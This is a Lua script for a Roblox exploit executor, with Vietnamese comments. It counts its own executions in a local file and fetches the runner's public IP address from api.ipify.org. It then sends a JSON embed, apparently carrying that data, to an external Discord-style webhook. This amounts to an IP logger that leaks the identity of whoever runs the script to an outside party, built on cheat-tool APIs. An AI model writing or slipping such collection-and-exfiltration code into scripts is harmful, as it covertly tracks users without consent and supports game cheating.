--================= ĐẾM SỐ LẦN EXECUTE (nếu có thể) =================
local ExecutionCount = "?"
local function updateCount()
    if type(readfile) == "function" and type(writefile) == "function" then
        local ok, data = pcall(readfile, "exec_count.txt")
        local count = 1
        if ok and data then
            count = tonumber(data) or 0
            count = count + 1
        end
        pcall(writefile, "exec_count.txt", tostring(count))
        ExecutionCount = tostring(count)
    else
        ExecutionCount = "N/A (no file access)"
    end
end
pcall(updateCount)
print("Đã Execute script được: ", ExecutionCount)

--================= LẤY IP (nếu hỗ trợ HTTP) =================
local PublicIP = "Unknown"
local function getIP()
    local requestFunc = http_request or request or (syn and syn.request) or (http and http.request)
    if requestFunc then
        local success, resp = pcall(function()
            return requestFunc({ Url = "https://api.ipify.org", Method = "GET" })
        end)
        if success and resp and resp.Body then
            PublicIP = resp.Body
        end
    end
end
pcall(getIP)
print("Script make by skid")

--================= GỬI WEBHOOK =================
local function send()
    local requestFunc = http_request or request or (syn and syn.request) or (http and http.request)
    if not requestFunc then
        warn("Nooooooooooooo")
        return
    end
    local success, err = pcall(function()
        requestFunc({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode({ embeds = { Embed } })
        })
    end)
    if success then
        print("Chạy Thành Công !")
    else
        warn("Memaybeo : " .. tostring(err))
    end
end
